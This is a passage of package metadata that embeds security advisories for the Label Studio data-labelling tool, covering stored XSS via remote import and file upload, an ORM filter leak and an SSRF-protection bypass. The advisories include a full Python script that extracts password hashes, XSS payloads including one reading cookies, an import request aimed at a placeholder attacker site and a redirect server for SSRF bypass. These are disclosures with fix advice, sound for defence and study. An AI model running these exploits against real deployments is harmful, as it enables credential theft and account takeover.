affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.9.2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.9.2/","requires_dist":["wheel (<=0.40.0,>=0.38.1)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=6.0.0)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (==1.28.58)","botocore (==1.31.58)","bleach (~=5.0.0)","google-api-core (==2.11.0)","google-auth (==2.14.1)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.4)","Django (==3.2.20)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","humansignal-drf-yasg (>=1.21.9)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.24.3)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (<4.0.0,>=3.15.5)","psycopg2-binary (==2.9.6)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (>=2.8.1)","pytz (~=2022.1)","requests (==2.31.0)","urllib3 (==1.26.17)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (~=3.5)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.57)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.9.2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"d548b33335ac082275eff3704fcfb6f060ab337b6bf09e2c296f83b91a824cbb","md5":"278538972d77a0e744b1b824a0419987","sha256":"74af158c37ff4c7c0bc33639a28d771c4a9bfe642378501016e0c5aa1f2fe87c"},"downloads":-1,"filename":"label_studio-1.9.2-py3-none-any.whl","has_sig":false,"md5_digest":"278538972d77a0e744b1b824a0419987","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":58030249,"upload_time":"2023-11-07T22:07:44","upload_time_iso_8601":"2023-11-07T22:07:44.523850Z","url":"https://files.pythonhosted.org/packages/d5/48/b33335ac082275eff3704fcfb6f060ab337b6bf09e2c296f83b91a824cbb/label_studio-1.9.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"72635298a2b24223ac0d55361e84f4c6882ce340fdeaf77dbd438c38a6d1ff0d","md5":"6887d5d24a44fdc22fe011e07da86869","sha256":"4d819d0977a17223d41af018134a74fbb427aa54e6880fb0304f6cef6366b20d"},"downloads":-1,"filename":"label-studio-1.9.2.tar.gz","has_sig":false,"md5_digest":"6887d5d24a44fdc22fe011e07da86869","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":56902465,"upload_time":"2023-11-07T22:07:50","upload_time_iso_8601":"2023-11-07T22:07:50.987557Z","url":"https://files.pythonhosted.org/packages/72/63/5298a2b24223ac0d55361e84f4c6882ce340fdeaf77dbd438c38a6d1ff0d/label-studio-1.9.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, 